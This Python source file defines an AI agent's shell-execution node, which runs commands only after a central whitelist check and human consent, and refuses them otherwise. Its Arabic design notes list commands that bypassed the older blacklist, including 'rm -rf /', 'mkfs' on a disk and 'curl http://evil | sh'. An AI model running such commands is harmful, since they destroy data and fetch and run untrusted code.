# core/dag/nodes/terminal.py
"""
عقدة الطرفية الحية (The Shell Executor).

S-2-REDESIGN v1.0 — حكم بشري، المصدر: المشغّل البشري (User):
  1. §3.1 — رُفع فحص الأمان المحلي من قائمة سوداء ثابتة (8 كلمات) إلى
     السياسة المركزية core.kernel.security.validate() — **نفس** الفحص
     المُختبر في مسار ShellTool (core/security.py شِيم إعادة تصدير لـ
     core.kernel.security). القائمة السوداء حُذفت قرارًا موثقًا:
     - متباعدة عن السياسة المركزية: كانت تسمح تجريبيًا بـ /bin/rm -rf / ،
       mkfs.ext4 /dev/sda ، curl http://evil | sh (مطابقة تامة للكلمة الأولى
       فقط → تجاوز بالمسار الكامل أو بامتداد الاسم).
     - validate() مبني على قائمة بيضاء ("Binary ... not whitelisted") تغطي
       الـ 8 كلمات وأكثر + فحص المسارات + حظر وسائط المفسّر (-c) + الأوامر
       التدميرية — أقوى تمامًا وأصل واحد للحقيقة الأمنية.
  2. §3.2 — أُضيف تماس موافقة (consent_callback) قبل default_guard.
     run_agent_command. القرار عند غياب الـ callback (الوضع الإنتاجي
     الحالي): **fail-open موثّق كدين صريح** — يُنفَّذ بمستوى الفحص المرفوع
     فقط مع تحذير مطبوع. توصيل ConsentManager الحقيقي من main.py يبقى
     بندًا مفتوحًا (DEBT_LEDGER) في عقد منفصل — لا يُقحَم هنا؛ درس
     S-2 المرجوع (19097c9): fail-closed بلا توصيل فعلي = كسر وظيفي فوري
     (كان يكسر مسار ShellTool، وهنا كان سيكسر /refactor و /dag).

S-2-FINAL — إغلاق الدين (توصيل فعلي + fail-closed):
  1. consent_callback يُوصَّل فعليًا: main.py (مسار /refactor) ينشئ
     ConsentManager ويُكيِّفه إلى ConsentCallback (confirm()→None = موافقة)
     ويمرره عبر launch_nabdos_core(consent_callback=...) إلى TerminalNode.
  2. عند غياب التماس: **fail-closed** — حجب محلي في هذه العقدة فقط؛ لا
     يمس default_guard العام ولا مسار ShellTool. الاستثناء الموثق:
     core/multi_agent_orchestrator.py:538 يبني TerminalNode() بلا تماس —
     لا مستدعٍ إنتاجي له (لا main ولا engine يستوردانه) — دين جانبي موثق.

ملاحظة صدق (القياس): default_guard.run_agent_command يستدعي validate()
داخليًا كخط دفاع خلفي — فالأمر الخطر لم يكن يُنفَّذ غالبًا حتى قبل هذا
الإصلاح. الثغرتان الحقيقيتان اللتان يُغلقان هنا: (أ) غياب الموافقة كليًا
في مسار DAG، و(ب) فحص محلي ضعيف متباعد بقابلية تجاوز مثبتة.
"""

from typing import Optional

from core.dag.base import BaseNode, Edge
from core.dag.context import NabdExecutionContext
from core.kernel.security import validate
from core.kernel.subprocess_guard import ConsentCallback, default_guard


class TerminalNode(BaseNode):
    """
    عقدة الطرفية الحية (The Shell Executor).
    تسمح للوكيل بتنفيذ أوامر داخل Termux/PRoot مع جدار حماية (Sandbox)
    عبر السياسة الأمنية المركزية core.kernel.security.validate().
    """

    def __init__(
        self,
        node_id: str = "terminal_node",
        consent_callback: Optional[ConsentCallback] = None,
    ):
        super().__init__(node_id)
        # تماس الموافقة — يُحقن من الطبقة العليا (main.py) في عقد توصيل منفصل.
        self._consent = consent_callback

    def _is_command_safe(self, command: str) -> bool:
        """فحص أمني عبر السياسة المركزية (قائمة بيضاء + مسارات + مفسّرات)."""
        ok, _reason = validate(command)
        return ok

    def execute(self, context: NabdExecutionContext) -> Edge:
        # نفترض أن الوكيل (Reasoner) وضع الأمر الذي يريد تشغيله في الذاكرة المشتركة
        command = context.shared_memory.pop('pending_command', None)

        if not command:
            print("📭 [Terminal] No pending commands requested by the Agent. Skipping.")
            return Edge(target_node_id="end", reason="No command to execute")

        print(f"\n🖥️  [Terminal Node] Agent requested execution: `{command}`")

        # 1. جدار الحماية (Sandbox Check) — السياسة المركزية (S-2-REDESIGN §3.1)
        if not self._is_command_safe(command):
            print(f"🚫 [Terminal] CRITICAL SECURITY BLOCK: Command '{command}' is forbidden in NabdOS sandbox!")
            context.shared_memory['human_feedback'] = f"System Sandbox blocked your command: {command}. Do NOT use forbidden commands."
            return Edge(target_node_id="reasoner_node", reason="Sandbox violation")

        # 2. بوابة الموافقة (S-2-REDESIGN §3.2) — قبل أي تنفيذ.
        #    tool_name = "execute_shell" (اصطلاح الحارس L258/369) لأن
        #    ConsentPolicy.requires_confirmation لا يفعل إلا له — أي مُكيّف
        #    مستقبلي نحو ConsentManager سيعمل فورًا بلا تعديل.
        if self._consent is not None:
            if not self._consent("execute_shell", {"command": command}):
                print(f"🚫 [Terminal] Consent denied for command: `{command}`")
                context.shared_memory['human_feedback'] = f"Command blocked: no approval for '{command}'"
                return Edge(target_node_id="reasoner_node", reason="Consent denied")
        else:
            # S-2-FINAL: fail-closed — لا تنفيذ بلا تماس موصول. الحجب محلي في
            # هذه العقدة فقط؛ لا يمس default_guard العام ولا مسار ShellTool.
            print(" 🚫 [Terminal] consent_callback not wired — fail-closed (S-2-FINAL)")
            context.shared_memory['human_feedback'] = "Command blocked: consent_callback not wired (fail-closed)"
            return Edge(target_node_id="reasoner_node", reason="Consent denied (no callback wired)")

        # 3. التنفيذ الفعلي (Subprocess Execution) — عبر الحارس المركزي (shell=False)
        print(" ⚙️ [Terminal] Executing command in isolated shell...")
        returncode, stdout, stderr = default_guard.run_agent_command(
            command, timeout=30
        )

        # 4. توجيه المسار بناءً على النتيجة (التعافي الذاتي)
        if returncode == 0:
            print(f" ✅ [Terminal] Success! Output:\n{stdout.strip()[:200]}...")
            context.shared_memory['terminal_output'] = stdout
            # إذا نجح الاختبار، ننهي المسار بسلام
            return Edge(target_node_id="end", reason="Tests/Command passed successfully")
        else:
            err = stderr or "Security Violation: command blocked."
            print(f" ❌ [Terminal] Command Failed. Output:\n{err.strip()[:200]}...")
            # تغذية العقل بالخطأ ليصلحه
            context.shared_memory['execution_error'] = f"Command `{command}` failed with output:\n{err}"
            print(" ⏪ [Terminal] Routing back to Reasoner to fix the code...")
            return Edge(target_node_id="reasoner_node", reason="Command failed, requesting self-healing")
